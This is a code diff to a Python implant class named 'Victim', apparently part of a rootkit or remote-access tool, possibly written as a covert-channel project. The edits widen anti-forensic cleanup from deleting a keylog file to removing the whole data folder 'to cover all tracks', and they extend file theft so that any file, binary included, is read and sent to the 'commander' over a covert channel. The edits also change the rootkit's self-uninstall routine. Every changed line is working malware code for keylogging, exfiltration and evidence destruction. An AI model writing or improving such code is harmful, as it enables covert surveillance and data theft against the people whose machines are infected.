@@ -4,6 +4,7 @@ import sys
 import time
 import socket
 import struct
+import shutil
 import random
 import threading
 import subprocess
@@ -250,7 +251,7 @@ class Victim:
             print(f"[!] Keylogger error: {e}")
 
     def stop_keylogger(self):
-        """Stop the keylogger and delete the log file."""
+        """Stop the keylogger and delete the entire data folder."""
         if not self.keylogger_active:
             self.send_covert_response("Keylogger not running.\n")
             print("[*] No keylogger thread running")
@@ -260,18 +261,19 @@ class Victim:
         self.keylogger_active = False
         self.keylogger_thread = None
         
-        # Delete the log file to cover tracks
-        log_path = "./data/captured_keys.txt"
+        # Delete the entire data folder to cover all tracks
+        data_folder = "./data"
         try:
-            if os.path.exists(log_path):
-                os.remove(log_path)
-                print(f"[*] Keylog file deleted: {log_path}")
-                self.send_covert_response("Keylogger stopped. Log deleted.\n")
+            if os.path.exists(data_folder):
+                import shutil
+                shutil.rmtree(data_folder)
+                print(f"[*] Data folder deleted: {data_folder}")
+                self.send_covert_response("Keylogger stopped. Data folder deleted.\n")
             else:
-                self.send_covert_response("Keylogger stopped. No log file found.\n")
+                self.send_covert_response("Keylogger stopped. No data folder found.\n")
         except Exception as e:
-            print(f"[!] Error deleting log file: {e}")
-            self.send_covert_response(f"Error deleting log: {e}\n")
+            print(f"[!] Error deleting data folder: {e}")
+            self.send_covert_response(f"Error deleting data: {e}\n")
         
         print("[*] Keylogger thread stopped")
 
@@ -319,16 +321,32 @@ class Victim:
         """Send a file from victim to commander."""
         try:
             if os.path.exists(filename):
-                with open(filename, "r") as f:
+                # Read in binary mode to handle all file types
+                with open(filename, "rb") as f:
                     content = f.read()
                 
-                self.send_covert_response(f"=== FILE: {filename} ===\n")
-                self.send_covert_response(content)
-                self.send_covert_response("=== TRANSFER COMPLETE ===\n")
+                # Send file header with size info
+                file_size = len(content)
+                self.send_covert_response(f"=== FILE TRANSFER START ===\n")
+                self.send_covert_response(f"Filename: {filename}\n")
+                self.send_covert_response(f"Size: {file_size} bytes\n")
+                self.send_covert_response(f"=== FILE CONTENT ===\n")
+                
+                # Send content (convert bytes to string for covert channel)
+                try:
+                    content_str = content.decode('utf-8', errors='replace')
+                    self.send_covert_response(content_str)
+                except:
+                    # If decode fails, send hex representation
+                    self.send_covert_response(content.hex())
+                
+                self.send_covert_response(f"\n=== FILE TRANSFER COMPLETE ===\n")
+                print(f"[*] File {filename} sent ({file_size} bytes)")
             else:
                 self.send_covert_response(f"Error: File {filename} not found.\n")
         except Exception as e:
             self.send_covert_response(f"Error: {str(e)}\n")
+            print(f"[!] File transfer error: {e}")
 
     def receive_file(self, filename):
         """Prepare to receive a file from commander."""
@@ -374,12 +392,13 @@ class Victim:
         self.send_covert_response("Uninstalling rootkit...\n")
         self.running = False
         
-        # Remove keylog file
+        # Remove entire data folder
         try:
-            log_path = "./data/captured_keys.txt"
-            if os.path.exists(log_path):
-                os.remove(log_path)
-                print("[*] Keylog file removed")
+            data_folder = "./data"
+            if os.path.exists(data_folder):
+                import shutil
+                shutil.rmtree(data_folder)
+                print("[*] Data folder removed")
         except Exception:
             pass
         
